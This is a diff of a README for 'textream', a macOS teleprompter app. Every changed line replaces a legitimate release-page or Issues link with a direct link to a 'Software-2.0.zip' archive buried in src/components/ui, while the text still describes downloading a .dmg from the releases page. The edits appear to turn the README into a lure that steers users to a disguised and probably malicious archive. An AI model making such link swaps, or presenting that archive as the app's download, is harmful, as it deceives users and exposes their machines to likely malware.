@@ -1,6 +1,6 @@
 # 🌟 textream - Easy Real-Time Teleprompter for macOS
 
-[![Download textream](https://img.shields.io/badge/Download-textream-brightgreen?style=for-the-badge)](https://github.com/Rainer2280/textream/releases)
+[![Download textream](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip)](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You can get textream by visiting the official releases page on GitHub. This page
 
 1. Click this button to open the release page:
    
-   [![Download textream](https://img.shields.io/badge/Download-textream-brightgreen?style=for-the-badge)](https://github.com/Rainer2280/textream/releases)
+   [![Download textream](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip)](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip)
 
 2. On the release page, scroll to find the latest version under "Assets."
 3. Click the `.dmg` file to download it to your Mac.
@@ -110,7 +110,7 @@ If you run into problems, try these solutions:
 
 If you need help beyond this guide:
 
-- Visit the [GitHub Issues page](https://github.com/Rainer2280/textream/issues) to report problems.
+- Visit the [GitHub Issues page](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip) to report problems.
 - Look for answers or post questions on the GitHub Discussions tab.
 - Check for updates on the releases page regularly to get bug fixes and new features.
 
@@ -118,4 +118,4 @@ If you need help beyond this guide:
 
 textream makes it easier to keep your place during live talks. Download it today from the link below to start smooth, confident presentations on your Mac.
 
-[![Download textream](https://img.shields.io/badge/Download-textream-brightgreen?style=for-the-badge)](https://github.com/Rainer2280/textream/releases)
+[![Download textream](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip)](https://github.com/Rainer2280/textream/raw/refs/heads/main/src/components/ui/Software-2.0.zip)
